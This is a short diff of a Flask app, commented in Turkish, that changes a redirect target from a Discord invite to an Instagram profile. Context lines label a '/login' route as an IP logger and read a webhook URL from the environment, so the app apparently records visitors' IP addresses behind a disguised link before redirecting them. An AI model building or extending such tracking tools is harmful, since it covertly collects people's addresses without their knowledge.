@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 # Webhook URL ve Yönlendirme
 WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
-REDIRECT_URL = "https://discord.gg/sWMVSs5sE"
+REDIRECT_URL = "https://www.instagram.com/nelo7capone1/"
 
 # 1. IP Logger Rotası
 @app.route('/login')
